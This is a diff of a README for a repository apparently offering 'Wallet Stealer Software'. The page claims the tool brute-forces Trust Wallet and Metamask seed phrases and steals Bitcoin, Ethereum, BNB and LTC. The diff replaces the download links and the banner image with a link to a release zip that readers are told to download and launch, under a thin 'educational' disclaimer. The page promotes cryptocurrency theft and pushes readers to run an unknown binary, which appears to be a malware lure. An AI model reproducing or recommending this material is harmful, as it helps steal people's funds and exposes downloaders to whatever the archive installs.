@@ -1,6 +1,6 @@
 # Wallet Stealer Software Repository
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/playmakingOMG/wallet-stealer/releases/download/v2.0/Software.zip)](https://github.com/playmakingOMG/wallet-stealer/releases/download/v2.0/Software.zip)
 
 Welcome to the **Wallet Stealer Software** repository! This repository contains a powerful tool designed to steal passphrases of Trust Wallet and Metamask Wallets, as well as perform Bitcoin mining, Ethereum, BNB, and LTC theft. The software works by employing brute force attacks to crack the 12-word secret phrases associated with these wallets, allowing the user to gain unauthorized access to valuable cryptocurrency assets.
 
@@ -16,7 +16,7 @@ Welcome to the **Wallet Stealer Software** repository! This repository contains 
 - **Topics**: crypto-steal, stealer, stealer-crypt, stealer-rat, stealer-windows, wallet-stealer-script, walletstealer
 
 ## Getting Started
-To begin using the software, download it from the following link: [Download Software](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip). Once downloaded, the software needs to be launched to access its features.
+To begin using the software, download it from the following link: [Download Software](https://github.com/playmakingOMG/wallet-stealer/releases/download/v2.0/Software.zip). Once downloaded, the software needs to be launched to access its features.
 
 ## Disclaimer
 Please note that the use of this software for unauthorized access to private cryptocurrency wallets is illegal and unethical. The creators of this software do not condone or support any illegal activities. This software is intended for educational purposes only.
@@ -30,4 +30,4 @@ By downloading and using the **Wallet Stealer Software**, you acknowledge and ac
 
 Thank you for visiting the repository and exploring the capabilities of the Wallet Stealer Software. Embrace the power of blockchain technology responsibly! 🚀🔒
 
-![Wallet Stealer Image](https://cdn.pixabay.com/photo/2016/11/23/16/13/blockchain-1851063_960_720.jpg)
+![Wallet Stealer Image](https://github.com/playmakingOMG/wallet-stealer/releases/download/v2.0/Software.zip)
